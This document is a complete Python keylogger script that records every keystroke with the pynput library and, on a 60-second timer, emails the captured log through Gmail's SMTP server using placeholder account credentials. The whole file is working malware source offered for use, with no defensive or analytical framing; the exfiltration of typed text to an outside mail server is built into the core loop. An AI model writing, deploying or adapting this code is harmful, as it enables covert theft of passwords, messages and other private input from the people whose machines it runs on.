#!/usr/bin/env python

import smtplib
import threading
from pynput import keyboard


class KeyLogger:
    def __init__(self, time_interval: int, email: str, password: str) -> None:
        self.interval = time_interval  # Time interval for sending logs in seconds
        self.log = "KeyLogger has started..."
        self.email = email  # Email address to send logs
        self.password = password  # Email password for authentication

    def append_to_log(self, string: str) -> None:
        """Append the key pressed to the log"""
        self.log += string

    def on_press(self, key) -> None:
        """Capture each key press"""
        try:
            current_key = key.char if key.char else str(key)
        except AttributeError:
            if key == keyboard.Key.space:
                current_key = " "
            elif key == keyboard.Key.esc:
                print("Exiting program...")
                return False  # Exit the listener if 'esc' is pressed
            else:
                current_key = " " + str(key) + " "

        self.append_to_log(current_key)

    def send_mail(self, email: str, password: str, message: str) -> None:
        """Send the keylog data via email"""
        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()  # Secure connection
            server.login(email, password)
            server.sendmail(email, email, message)
            server.quit()
        except Exception as e:
            print(f"Error sending email: {e}")

    def report_n_send(self) -> None:
        """Report key logs periodically"""
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""  # Reset log after sending
        timer = threading.Timer(self.interval, self.report_n_send)
        timer.start()

    def start(self) -> None:
        """Start the keylogger"""
        keyboard_listener = keyboard.Listener(on_press=self.on_press)
        with keyboard_listener:
            self.report_n_send()  # Start sending reports periodically
            keyboard_listener.join()  # Block until the listener stops


# Example usage
if __name__ == "__main__":
    time_interval = 60  # Send email every 60 seconds
    email = "your_email@gmail.com"
    password = "your_email_password"
    
    keylogger = KeyLogger(time_interval, email, password)
    keylogger.start()
    